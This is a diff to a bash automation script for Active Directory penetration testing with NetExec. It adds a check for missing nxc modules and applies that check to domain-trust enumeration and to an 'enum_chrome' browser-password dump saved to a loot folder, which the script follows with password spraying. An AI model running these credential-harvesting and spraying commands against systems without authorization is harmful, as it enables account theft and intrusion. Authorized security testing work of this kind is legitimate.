@@ -77,6 +77,13 @@ creds_log() {
     fi
 }
 
+# nxc_module_failed <output_file> — true (0) when an -M module did not actually
+# run on this NetExec version: argparse "invalid choice", or a [REMOVED]/moved-to
+# stub. Lets callers avoid treating a removal notice as real enumeration data.
+nxc_module_failed() {
+    grep -qiE 'invalid choice|\[REMOVED\]|module .*not found|no module named|has been removed|moved to' "$1" 2>/dev/null
+}
+
 #------------------------------------------------------------------------------
 # PROGRESS TRACKING
 # Format: TIMESTAMP | STATUS | PHASE | DETAIL
@@ -1006,9 +1013,12 @@ phase2b_ldap_enum() {
     cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} -M enum_trusts"
     timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" -M enum_trusts \
         > "${ldap_dir}/trusts.txt" 2>&1 || true
+    if nxc_module_failed "${ldap_dir}/trusts.txt"; then
+        warn "nxc -M enum_trusts unavailable on this NetExec version — trust enum skipped"
+        warn "  Trusts: review the BloodHound graph (collected below), or run: nxc ldap ${DC_IP} <auth> --dc-list"
     # Require an actual trust record (direction/type), not the bare word "trust"
-    # which appears in the enum_trusts module banner and "no trusts" messages.
-    if grep -qiE 'Bidirectional|Inbound|Outbound|Parent-Child|External|Forest|targetName' "${ldap_dir}/trusts.txt" 2>/dev/null; then
+    # which appears in the module banner and "no trusts" messages.
+    elif grep -qiE 'Bidirectional|Inbound|Outbound|Parent-Child|External|Forest|targetName' "${ldap_dir}/trusts.txt" 2>/dev/null; then
         success "Domain trusts enumerated → ldap/trusts.txt"
         echo "DOMAIN_TRUSTS=YES" >> "${OUTDIR}/summary_notes.txt"
     fi
@@ -1816,8 +1826,13 @@ mode_chain() {
         timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" -M enum_chrome \
             > "${loot_dir}/browser_creds.txt" 2>&1 || true
 
-        # Parse browser_creds.txt for cleartext passwords
-        if [[ -s "${loot_dir}/browser_creds.txt" ]]; then
+        # Parse browser_creds.txt — but only if the module actually ran. enum_chrome
+        # is absent in newer NetExec (1.4.0); skip the parse AND the spray follow-up
+        # so we never emit a "spray from enum_chrome dump" step for a dump that was
+        # never produced.
+        if nxc_module_failed "${loot_dir}/browser_creds.txt"; then
+            warn "nxc -M enum_chrome unavailable on this NetExec version — browser-cred dump skipped (try -M firefox / DPAPI)"
+        elif [[ -s "${loot_dir}/browser_creds.txt" ]]; then
             local browser_pw_count=0
             browser_pw_count=$(grep -ciE 'password|passwd' "${loot_dir}/browser_creds.txt" 2>/dev/null || echo 0)
             if (( browser_pw_count > 0 )); then
